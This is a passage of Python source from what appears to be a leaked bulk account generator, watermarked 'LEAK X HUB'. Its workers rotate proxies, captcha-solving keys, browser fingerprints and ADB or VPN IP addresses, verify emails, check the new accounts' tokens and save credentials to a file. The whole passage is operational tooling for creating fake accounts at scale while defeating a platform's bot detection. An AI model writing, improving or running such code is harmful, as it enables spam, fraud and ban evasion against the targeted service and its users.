                log.warning("Email verification failed or timed out")
                with ACCOUNT_STATS_LOCK:
                    ACCOUNT_STATS['captcha_fail'] += 1
            
            result = check_token(token, proxy_config)
            log.token_status(result)
            
            # Track proxy usage
            if proxy_config:
                track_proxy_usage(proxy_config.get('masked_url', proxy_config.get('full_url', 'unknown')), result == 'VALID')
            
            save_account_to_file(email, account_password, token, result)
            
            if current_fingerprint:
                consume_fingerprint(current_fingerprint)
                fingerprint_removed = True

            with LOCK:
                SESSION_CREATED += 1
                created_now = SESSION_CREATED

            if ADB_ENABLED:
                if adb_change_ip():
                    try:
                        new_ip = get_public_ip()
                        global ADB_LAST_IP
                        if new_ip:
                            if ADB_LAST_IP and ADB_LAST_IP != new_ip:
                                log.info(f"IP changed: {ADB_LAST_IP} -> {new_ip}")
                            else:
                                log.info(f"IP: {new_ip}")
                            ADB_LAST_IP = new_ip
                    except Exception:
                        pass
            
            if SESSION_TARGET > 0 and created_now >= SESSION_TARGET:
                with LOCK:
                    SESSION_STOP = True
        else:
            log.error("No token received")
            
    except StopIteration:
        log.warning("Worker stopped")
    except Exception as e:
        log.error(f"Error: {e}")
    
    finally:
        if not fingerprint_removed and current_fingerprint:
            release_fingerprint(current_fingerprint)
        if browser:
            try:
                await browser.stop()
            except:
                pass
        if temp_profile and os.path.exists(temp_profile):
            try:
                shutil.rmtree(temp_profile, ignore_errors=True)
            except:
                pass
        with WORKER_LOCK:
            ACTIVE_WORKERS -= 1

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# RUN WORKERS
# ============================================================================

async def run_workers():
    global SESSION_TARGET, SESSION_CREATED, SESSION_STOP, PROXY_LIST
    
    all_proxies = load_proxies(config)
    with PROXY_LIST_LOCK:
        PROXY_LIST = all_proxies if all_proxies else []
    
    while not SESSION_STOP:
        with LOCK:
            if SESSION_TARGET > 0 and SESSION_CREATED >= SESSION_TARGET:
                SESSION_STOP = True
                break
        
        accounts_before = SESSION_CREATED
        remaining = SESSION_TARGET - SESSION_CREATED if SESSION_TARGET > 0 else THREAD_COUNT
        batch_size = min(THREAD_COUNT, remaining) if SESSION_TARGET > 0 else THREAD_COUNT
        
        if batch_size <= 0 and SESSION_TARGET > 0:
            break
        
        tasks = []
        for i in range(batch_size):
            worker_id = random.randint(10000, 99999)
            current_proxy = get_random_proxy()
            rotate_nopecha_key()
            fingerprint = reserve_fingerprint()
            tasks.append(asyncio.create_task(worker(worker_id, current_proxy, fingerprint)))
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
        
        accounts_created = SESSION_CREATED - accounts_before
        
        if SESSION_TARGET > 0:
            if SESSION_CREATED < SESSION_TARGET:
                await batch_cooldown(batch_size, accounts_created)
        else:
            await batch_cooldown(batch_size, accounts_created)
        
        await asyncio.sleep(0.1)
    
    log.success(f"Completed! Created {SESSION_CREATED} account(s)")

# ============================================================
# WATERMARK - LEAK X HUB
# ============================================================

# ============================================================================
# MAIN FUNCTION
# ============================================================================

async def main():
    global SESSION_TARGET, console_ui
    
    console_ui = ConsoleUI(log, refresh=0.5)
    console_ui.start()
    
    current_ip = None

    if MULLVAD_AVAILABLE:
        current_ip = mullvad_get_ip()
    elif URBANVPN_AVAILABLE:
        urbanvpn_config = config.get("urbanvpn", {})
        server = urbanvpn_config.get("server", "us")
        if not urbanvpn_connect(server):
            log.error(f"UrbanVPN connect failed for server: {server}")
            return
        current_ip = get_public_ip()
    else:
        current_ip = get_public_ip()

    show_banner(ip=current_ip, threads=THREAD_COUNT)

    has_enabled = False
    for name, provider in config.get("email_providers", {}).items():
        if provider.get("enabled", False):
            has_enabled = True
            break
    
    if not has_enabled:
        log.error("No email providers enabled! Please enable at least one provider in config.json")
        return

    show_balance_and_stock()
    print()
    
    download_nopecha_ext()
    
    try:
        await run_workers()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Stopped by user{RESET}")
    
    show_proxy_stats()
    log.show_final_stats()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Stopped by user{RESET}")
    except Exception as e:
        log.error(f"Error: {e}")
    finally:
        if console_ui:
            console_ui.stop()
        
        stats = get_account_stats()
        if stats['total'] > 0:
            print()
            print(log._gradient('FINAL STATS', LX_RED))
            valid_percent = (stats['valid'] / (stats['valid'] + stats['locked']) * 100) if (stats['valid'] + stats['locked']) > 0 else 0
            print(log._gradient(f'VALID   | #{stats["valid"]} | {valid_percent:.1f}%', LX_YELLOW))
            print(log._gradient(f'LOCKED  | #{stats["locked"]}', LX_RED))
            print(log._gradient(' @WATERMARK BY LEAK X HUB | discord.gg/leakx', LX_YELLOW))
            print()

# ============================================================
# WATERMARK - LEAK X HUB
# @WATERMARK BY LEAK X HUB
# discord.gg/leakx
# ============================================================
